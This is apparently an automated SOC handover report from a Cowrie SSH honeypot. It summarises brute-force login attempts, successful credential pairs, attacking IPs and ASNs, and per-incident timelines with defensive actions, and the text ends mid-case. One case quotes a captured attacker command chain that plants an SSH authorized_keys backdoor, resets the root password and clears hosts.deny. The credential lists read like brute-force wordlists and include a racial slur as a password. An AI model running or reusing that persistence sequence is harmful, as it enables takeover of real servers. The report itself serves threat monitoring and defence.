# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-18 |
| **Generated At** | 2026-03-18T13:07:02Z |
| **Shift Time** | 13:07 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **929** |
| Confirmed Threats | **379** |
| False Positives Filtered | **550** (59.2%) |
| Unique Attacker IPs | **153** |
| Countries of Origin | **36** |
| High Severity Cases | **83** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **846** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **403** |
| Unique Credential Pairs | **350** |
| Unique Usernames | **215** |
| Unique Passwords | **252** |
| Successful Auth Pairs | **78** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 88 |
| `345gs5662d34` | 15 |
| `ubuntu` | 14 |
| `admin` | 12 |
| `test` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 34 |
| `345gs5662d34` | 15 |
| `3245gs5662d34` | 14 |
| `12345678` | 12 |
| `123` | 12 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 15 |
| `root` | `3245gs5662d34` | 14 |
| `admin` | `admin` | 4 |
| `root` | `` | 4 |
| `root` | `ubuntu` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `ubuntu` | `147.189.161.77` | 2026-03-18T00:05:03 |
| `root` | `Admin1235` | `183.81.33.183` | 2026-03-18T00:08:28 |
| `root` | `66666` | `61.145.163.164` | 2026-03-18T00:09:57 |
| `root` | `66666` | `197.155.225.93` | 2026-03-18T00:10:11 |
| `root` | `admin@123` | `143.244.146.173` | 2026-03-18T00:13:54 |
| `root` | `1` | `143.244.146.173` | 2026-03-18T00:14:26 |
| `root` | `QWERTY123` | `143.244.146.173` | 2026-03-18T00:14:59 |
| `root` | `Pass@123` | `143.244.146.173` | 2026-03-18T00:15:18 |
| `root` | `!Q@W3e4r` | `143.244.146.173` | 2026-03-18T00:15:24 |
| `root` | `Admin1236` | `183.81.33.183` | 2026-03-18T00:24:25 |
| `root` | `Admin1237` | `183.81.33.183` | 2026-03-18T00:41:56 |
| `root` | `server123` | `120.48.174.68` | 2026-03-18T00:43:29 |
| `root` | `Admin1238` | `183.81.33.183` | 2026-03-18T00:58:35 |
| `root` | `admin` | `116.110.23.141` | 2026-03-18T01:02:08 |
| `root` | `Admin1239` | `183.81.33.183` | 2026-03-18T01:14:32 |
| `root` | `Admin12310` | `183.81.33.183` | 2026-03-18T01:30:07 |
| `root` | `explorer` | `116.110.156.14` | 2026-03-18T01:32:28 |
| `root` | `Admin12340` | `183.81.33.183` | 2026-03-18T01:47:37 |
| `root` | `a1s2d3f4` | `137.184.78.9` | 2026-03-18T02:03:40 |
| `root` | `Qq123456` | `137.184.78.9` | 2026-03-18T02:03:53 |
| `root` | `!QAZ2wsx` | `137.184.78.9` | 2026-03-18T02:04:07 |
| `root` | `root12345` | `137.184.78.9` | 2026-03-18T02:04:47 |
| `root` | `passwd` | `137.184.78.9` | 2026-03-18T02:05:07 |
| `root` | `123321` | `137.184.78.9` | 2026-03-18T02:05:27 |
| `root` | `Aa123456.` | `137.184.78.9` | 2026-03-18T02:06:06 |
| `root` | `Abc123456` | `137.184.78.9` | 2026-03-18T02:06:26 |
| `root` | `201314` | `101.36.106.113` | 2026-03-18T03:24:41 |
| `root` | `3245gs5662d34` | `101.36.106.113` | 2026-03-18T03:24:44 |
| `root` | `ubuntu` | `219.153.106.29` | 2026-03-18T04:12:51 |
| `root` | `qwer!234` | `180.76.245.60` | 2026-03-18T05:04:43 |
| `root` | `lj123456` | `103.7.41.144` | 2026-03-18T06:12:24 |
| `root` | `3245gs5662d34` | `103.7.41.144` | 2026-03-18T06:12:27 |
| `root` | `QWERTY123` | `174.138.33.218` | 2026-03-18T06:41:35 |
| `root` | `1` | `174.138.33.218` | 2026-03-18T06:41:48 |
| `root` | `12345678` | `174.138.33.218` | 2026-03-18T06:42:14 |
| `root` | `P@ssw0rd2026` | `174.138.33.218` | 2026-03-18T06:42:39 |
| `root` | `root@2026` | `174.138.33.218` | 2026-03-18T06:42:52 |
| `root` | `redhat` | `174.138.33.218` | 2026-03-18T06:43:43 |
| `root` | `qazwsx123` | `174.138.33.218` | 2026-03-18T06:44:09 |
| `root` | `Admin123` | `174.138.33.218` | 2026-03-18T06:44:27 |
| `root` | `11` | `174.138.33.218` | 2026-03-18T06:44:53 |
| `root` | `Qwerty1` | `174.138.33.218` | 2026-03-18T06:45:05 |
| `root` | `Password` | `174.138.33.218` | 2026-03-18T06:45:49 |
| `root` | `eve` | `174.138.33.218` | 2026-03-18T06:47:05 |
| `root` | `ubuntu` | `41.111.172.2` | 2026-03-18T06:54:08 |
| `root` | `Welcome@2024` | `95.70.212.76` | 2026-03-18T07:57:09 |
| `root` | `3245gs5662d34` | `95.70.212.76` | 2026-03-18T07:57:14 |
| `root` | `nigger` | `186.4.240.226` | 2026-03-18T07:58:01 |
| `root` | `3245gs5662d34` | `186.4.240.226` | 2026-03-18T07:58:08 |
| `root` | `1q2w3e4r5t6y7u` | `95.70.212.76` | 2026-03-18T08:05:04 |
| `root` | `6666` | `90.173.78.90` | 2026-03-18T09:04:47 |
| `root` | `qwer1234QWER` | `120.62.8.17` | 2026-03-18T10:47:34 |
| `root` | `3245gs5662d34` | `120.62.8.17` | 2026-03-18T10:47:36 |
| `root` | `Lm123456` | `197.248.8.33` | 2026-03-18T10:48:24 |
| `root` | `3245gs5662d34` | `197.248.8.33` | 2026-03-18T10:48:29 |
| `root` | `Lai123456` | `197.248.8.33` | 2026-03-18T10:55:07 |
| `root` | `Aa@13579` | `197.248.8.33` | 2026-03-18T10:56:01 |
| `root` | `a111222` | `177.92.51.57` | 2026-03-18T11:00:57 |
| `root` | `3245gs5662d34` | `177.92.51.57` | 2026-03-18T11:01:04 |
| `root` | `root@123` | `177.92.51.57` | 2026-03-18T11:16:33 |
| `root` | `Aa123123` | `103.237.144.204` | 2026-03-18T11:18:47 |
| `root` | `3245gs5662d34` | `103.237.144.204` | 2026-03-18T11:18:52 |
| `root` | `rootroot` | `157.245.94.161` | 2026-03-18T11:34:19 |
| `root` | `pass` | `157.245.94.161` | 2026-03-18T11:34:33 |
| `root` | `aA123456` | `157.245.94.161` | 2026-03-18T11:34:47 |
| `root` | `Admin@123456` | `157.245.94.161` | 2026-03-18T11:34:53 |
| `root` | `redhat` | `157.245.94.161` | 2026-03-18T11:35:06 |
| `root` | `11` | `157.245.94.161` | 2026-03-18T11:35:39 |
| `root` | `passw0rd` | `157.245.94.161` | 2026-03-18T11:36:12 |
| `root` | `Root@123` | `157.245.94.161` | 2026-03-18T11:36:32 |
| `root` | `qq123456` | `157.245.94.161` | 2026-03-18T11:36:38 |
| `root` | `123abc456` | `157.245.94.161` | 2026-03-18T11:36:51 |
| `root` | `Pass@123` | `157.245.94.161` | 2026-03-18T11:37:31 |
| `root` | `12345qwert` | `157.245.94.161` | 2026-03-18T11:37:58 |
| `root` | `debian` | `180.76.175.142` | 2026-03-18T11:46:12 |
| `root` | `!Aa123456` | `43.100.77.140` | 2026-03-18T12:23:09 |
| `root` | `3245gs5662d34` | `43.100.77.140` | 2026-03-18T12:23:12 |
| `root` | `abc123$%^` | `43.100.77.140` | 2026-03-18T12:30:49 |

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **153** |
| Unique ASNs | **79** |
| High-Risk ASNs | **67** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 8 | HIGH |
| `AS46562` | Performive LLC | 7 | MEDIUM |
| `AS4134` | CHINANET-BACKBONE | 7 | HIGH |
| `AS22773` | Cox Communications Inc. | 6 | MEDIUM |
| `AS14061` | DigitalOcean, LLC | 5 | HIGH |
| `AS4766` | Korea Telecom | 5 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 5 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 5 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (78)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-25521f2b759a

| Field | Detail |
|---|---|
| **Source IP** | `147.189.161[.]77` |
| **First Seen** | 2026-03-18 00:05 |
| **Last Seen** | 2026-03-18 00:06 |
| **Session Duration** | 84s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 00:05:02` | `cowrie.session.connect` |
| `2026-03-18 00:05:02` | `cowrie.client.version` |
| `2026-03-18 00:05:02` | `cowrie.client.kex` |
| `2026-03-18 00:05:03` | `cowrie.login.success` |
| `2026-03-18 00:06:26` | `cowrie.session.file_upload` |
| `2026-03-18 00:06:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.189.161[.]77` to AbuseIPDB if not already reported
- [ ] Block `147.189.161[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-302d3f42333b

| Field | Detail |
|---|---|
| **Source IP** | `183.81.33[.]183` |
| **First Seen** | 2026-03-18 00:08 |
| **Last Seen** | 2026-03-18 00:08 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 00:08:05` | `cowrie.session.connect` |
| `2026-03-18 00:08:08` | `cowrie.client.version` |
| `2026-03-18 00:08:08` | `cowrie.client.kex` |
| `2026-03-18 00:08:28` | `cowrie.login.success` |
| `2026-03-18 00:08:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.81.33[.]183` to AbuseIPDB if not already reported
- [ ] Block `183.81.33[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-feb05403c6f3

| Field | Detail |
|---|---|
| **Source IP** | `61.145.163[.]164` |
| **First Seen** | 2026-03-18 00:09 |
| **Last Seen** | 2026-03-18 00:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 00:09:54` | `cowrie.session.connect` |
| `2026-03-18 00:09:55` | `cowrie.client.version` |
| `2026-03-18 00:09:55` | `cowrie.client.kex` |
| `2026-03-18 00:09:57` | `cowrie.login.success` |
| `2026-03-18 00:09:58` | `cowrie.direct-tcpip.request` |
| `2026-03-18 00:10:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.145.163[.]164` to AbuseIPDB if not already reported
- [ ] Block `61.145.163[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad9aa6510c92

| Field | Detail |
|---|---|
| **Source IP** | `197.155.225[.]93` |
| **First Seen** | 2026-03-18 00:10 |
| **Last Seen** | 2026-03-18 00:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 00:10:08` | `cowrie.session.connect` |
| `2026-03-18 00:10:09` | `cowrie.client.version` |
| `2026-03-18 00:10:09` | `cowrie.client.kex` |
| `2026-03-18 00:10:11` | `cowrie.login.success` |
| `2026-03-18 00:10:12` | `cowrie.direct-tcpip.request` |
| `2026-03-18 00:10:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.155.225[.]93` to AbuseIPDB if not already reported
- [ ] Block `197.155.225[.]93` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-381287b8076d

| Field | Detail |
|---|---|
| **Source IP** | `183.81.33[.]183` |
| **First Seen** | 2026-03-18 00:24 |
| **Last Seen** | 2026-03-18 00:24 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 00:24:12` | `cowrie.session.connect` |
| `2026-03-18 00:24:15` | `cowrie.client.version` |
| `2026-03-18 00:24:15` | `cowrie.client.kex` |
| `2026-03-18 00:24:25` | `cowrie.login.success` |
| `2026-03-18 00:24:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.81.33[.]183` to AbuseIPDB if not already reported
- [ ] Block `183.81.33[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5527602aed0

| Field | Detail |
|---|---|
| **Source IP** | `183.81.33[.]183` |
| **First Seen** | 2026-03-18 00:41 |
| **Last Seen** | 2026-03-18 00:41 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 00:41:29` | `cowrie.session.connect` |
| `2026-03-18 00:41:34` | `cowrie.client.version` |
| `2026-03-18 00:41:34` | `cowrie.client.kex` |
| `2026-03-18 00:41:56` | `cowrie.login.success` |
| `2026-03-18 00:41:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.81.33[.]183` to AbuseIPDB if not already reported
- [ ] Block `183.81.33[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6daeefdcc162

| Field | Detail |
|---|---|
| **Source IP** | `120.48.174[.]68` |
| **First Seen** | 2026-03-18 00:43 |
| **Last Seen** | 2026-03-18 00:45 |
| **Session Duration** | 101s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:G2FwhsquDwpq"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 00:43:27` | `cowrie.session.connect` |
| `2026-03-18 00:43:27` | `cowrie.client.version` |
| `2026-03-18 00:43:27` | `cowrie.client.kex` |
| `2026-03-18 00:43:29` | `cowrie.login.success` |
| `2026-03-18 00:43:30` | `cowrie.session.params` |
| `2026-03-18 00:43:30` | `cowrie.command.input` |
| `2026-03-18 00:43:30` | `cowrie.command.failed` |
| `2026-03-18 00:43:31` | `cowrie.log.closed` |
| `2026-03-18 00:43:34` | `cowrie.session.params` |
| `2026-03-18 00:43:34` | `cowrie.command.input` |
| `2026-03-18 00:43:35` | `cowrie.session.file_download` |
| `2026-03-18 00:43:35` | `cowrie.log.closed` |
| `2026-03-18 00:43:51` | `cowrie.session.params` |
| `2026-03-18 00:43:51` | `cowrie.command.input` |
| `2026-03-18 00:43:52` | `cowrie.log.closed` |
| `2026-03-18 00:43:55` | `cowrie.session.params` |
| `2026-03-18 00:43:55` | `cowrie.command.input` |
| `2026-03-18 00:43:55` | `cowrie.log.closed` |
| `2026-03-18 00:43:56` | `cowrie.session.params` |
| `2026-03-18 00:43:56` | `cowrie.command.input` |
| `2026-03-18 00:43:58` | `cowrie.session.file_download` |
| `2026-03-18 00:43:58` | `cowrie.log.closed` |
| `2026-03-18 00:44:02` | `cowrie.session.params` |
| `2026-03-18 00:44:02` | `cowrie.command.input` |
| `2026-03-18 00:44:09` | `cowrie.log.closed` |
| `2026-03-18 00:44:10` | `cowrie.session.params` |
| `2026-03-18 00:44:10` | `cowrie.command.input` |
| `2026-03-18 00:44:10` | `cowrie.log.closed` |
| `2026-03-18 00:44:20` | `cowrie.session.params` |
| `2026-03-18 00:44:20` | `cowrie.command.input` |
| `2026-03-18 00:44:35` | `cowrie.log.closed` |
| `2026-03-18 00:44:37` | `cowrie.session.params` |
| `2026-03-18 00:44:37` | `cowrie.command.input` |
| `2026-03-18 00:44:39` | `cowrie.log.closed` |
| `2026-03-18 00:44:40` | `cowrie.session.params` |
| `2026-03-18 00:44:40` | `cowrie.command.input` |
| `2026-03-18 00:44:40` | `cowrie.log.closed` |
| `2026-03-18 00:44:43` | `cowrie.session.params` |
| `2026-03-18 00:44:43` | `cowrie.command.input` |
| `2026-03-18 00:44:44` | `cowrie.log.closed` |
| `2026-03-18 00:44:44` | `cowrie.session.params` |
| `2026-03-18 00:44:44` | `cowrie.command.input` |
| `2026-03-18 00:44:45` | `cowrie.log.closed` |
| `2026-03-18 00:44:47` | `cowrie.session.params` |
| `2026-03-18 00:44:47` | `cowrie.command.input` |
| `2026-03-18 00:44:51` | `cowrie.log.closed` |
| `2026-03-18 00:45:00` | `cowrie.session.params` |
| `2026-03-18 00:45:00` | `cowrie.command.input` |
| `2026-03-18 00:45:00` | `cowrie.log.closed` |
| `2026-03-18 00:45:02` | `cowrie.session.params` |
| `2026-03-18 00:45:02` | `cowrie.command.input` |
| `2026-03-18 00:45:08` | `cowrie.log.closed` |
| `2026-03-18 00:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.174[.]68` to AbuseIPDB if not already reported
- [ ] Block `120.48.174[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28b5dee6914c

| Field | Detail |
|---|---|
| **Source IP** | `183.81.33[.]183` |
| **First Seen** | 2026-03-18 00:58 |
| **Last Seen** | 2026-03-18 00:58 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 00:58:09` | `cowrie.session.connect` |
| `2026-03-18 00:58:13` | `cowrie.client.version` |
| `2026-03-18 00:58:13` | `cowrie.client.kex` |
| `2026-03-18 00:58:35` | `cowrie.login.success` |
| `2026-03-18 00:58:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.81.33[.]183` to AbuseIPDB if not already reported
- [ ] Block `183.81.33[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f5886e1c77d

| Field | Detail |
|---|---|
| **Source IP** | `116.110.23[.]141` |
| **First Seen** | 2026-03-18 01:02 |
| **Last Seen** | 2026-03-18 01:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 01:02:07` | `cowrie.session.connect` |
| `2026-03-18 01:02:07` | `cowrie.client.version` |
| `2026-03-18 01:02:07` | `cowrie.client.kex` |
| `2026-03-18 01:02:08` | `cowrie.login.success` |
| `2026-03-18 01:02:08` | `cowrie.direct-tcpip.request` |
| `2026-03-18 01:02:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-03-18 01:02:08` | `cowrie.direct-tcpip.data` |
| `2026-03-18 01:02:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.23[.]141` to AbuseIPDB if not already reported
- [ ] Block `116.110.23[.]141` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06e8d93f0c3c

| Field | Detail |
|---|---|
| **Source IP** | `183.81.33[.]183` |
| **First Seen** | 2026-03-18 01:14 |
| **Last Seen** | 2026-03-18 01:14 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 01:14:08` | `cowrie.session.connect` |
| `2026-03-18 01:14:11` | `cowrie.client.version` |
| `2026-03-18 01:14:11` | `cowrie.client.kex` |
| `2026-03-18 01:14:32` | `cowrie.login.success` |
| `2026-03-18 01:14:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.81.33[.]183` to AbuseIPDB if not already reported
- [ ] Block `183.81.33[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f62fea7e25a4

| Field | Detail |
|---|---|
| **Source IP** | `183.81.33[.]183` |
| **First Seen** | 2026-03-18 01:29 |
| **Last Seen** | 2026-03-18 01:30 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 01:29:40` | `cowrie.session.connect` |
| `2026-03-18 01:29:45` | `cowrie.client.version` |
| `2026-03-18 01:29:45` | `cowrie.client.kex` |
| `2026-03-18 01:30:07` | `cowrie.login.success` |
| `2026-03-18 01:30:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.81.33[.]183` to AbuseIPDB if not already reported
- [ ] Block `183.81.33[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57fe673154ac

| Field | Detail |
|---|---|
| **Source IP** | `116.110.156[.]14` |
| **First Seen** | 2026-03-18 01:32 |
| **Last Seen** | 2026-03-18 01:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 01:32:28` | `cowrie.session.connect` |
| `2026-03-18 01:32:28` | `cowrie.client.version` |
| `2026-03-18 01:32:28` | `cowrie.client.kex` |
| `2026-03-18 01:32:28` | `cowrie.login.success` |
| `2026-03-18 01:32:29` | `cowrie.direct-tcpip.request` |
| `2026-03-18 01:32:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-03-18 01:32:30` | `cowrie.direct-tcpip.data` |
| `2026-03-18 01:32:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.156[.]14` to AbuseIPDB if not already reported
- [ ] Block `116.110.156[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0db12a4af91

| Field | Detail |
|---|---|
| **Source IP** | `183.81.33[.]183` |
| **First Seen** | 2026-03-18 01:47 |
| **Last Seen** | 2026-03-18 01:47 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 01:47:11` | `cowrie.session.connect` |
| `2026-03-18 01:47:15` | `cowrie.client.version` |
| `2026-03-18 01:47:15` | `cowrie.client.kex` |
| `2026-03-18 01:47:37` | `cowrie.login.success` |
| `2026-03-18 01:47:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.81.33[.]183` to AbuseIPDB if not already reported
- [ ] Block `183.81.33[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a454ad72f58

| Field | Detail |
|---|---|
| **Source IP** | `137.184.78[.]9` |
| **First Seen** | 2026-03-18 02:03 |
| **Last Seen** | 2026-03-18 02:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 02:03:39` | `cowrie.session.connect` |
| `2026-03-18 02:03:39` | `cowrie.client.version` |
| `2026-03-18 02:03:39` | `cowrie.client.kex` |
| `2026-03-18 02:03:40` | `cowrie.login.success` |
| `2026-03-18 02:03:41` | `cowrie.session.params` |
| `2026-03-18 02:03:41` | `cowrie.command.input` |
| `2026-03-18 02:03:41` | `cowrie.log.closed` |
| `2026-03-18 02:03:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `137.184.78[.]9` to AbuseIPDB if not already reported
- [ ] Block `137.184.78[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88e7747ec2b7

| Field | Detail |
|---|---|
| **Source IP** | `137.184.78[.]9` |
| **First Seen** | 2026-03-18 02:03 |
| **Last Seen** | 2026-03-18 02:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 02:03:52` | `cowrie.session.connect` |
| `2026-03-18 02:03:52` | `cowrie.client.version` |
| `2026-03-18 02:03:53` | `cowrie.client.kex` |
| `2026-03-18 02:03:53` | `cowrie.login.success` |
| `2026-03-18 02:03:54` | `cowrie.session.params` |
| `2026-03-18 02:03:54` | `cowrie.command.input` |
| `2026-03-18 02:03:54` | `cowrie.log.closed` |
| `2026-03-18 02:03:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `137.184.78[.]9` to AbuseIPDB if not already reported
- [ ] Block `137.184.78[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fb3a9165544

| Field | Detail |
|---|---|
| **Source IP** | `137.184.78[.]9` |
| **First Seen** | 2026-03-18 02:04 |
| **Last Seen** | 2026-03-18 02:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-18 02:04:06` | `cowrie.session.connect` |
| `2026-03-18 02:04:06` | `cowrie.client.version` |
| `2026-03-18 02:04:06` | `cowrie.client.kex` |
| `2026-03-18 02:04:07` | `cowrie.login.success` |
| `2026-03-18 02:04:07` | `cowrie.session.params` |
| `2026-03-18 02:04:07` | `cowrie.command.input` |
| `2026-03-18 02:04:07` | `cowrie.log.closed` |
| `2026-03-18 02:04:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `137.184.78[.]9` to AbuseIPDB if not already reported
- [ ] Block `137.184.78[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d465b4a154eb

| Field | Detail |
|---|---|
| **Source IP** | `137.184.78[.]9` |
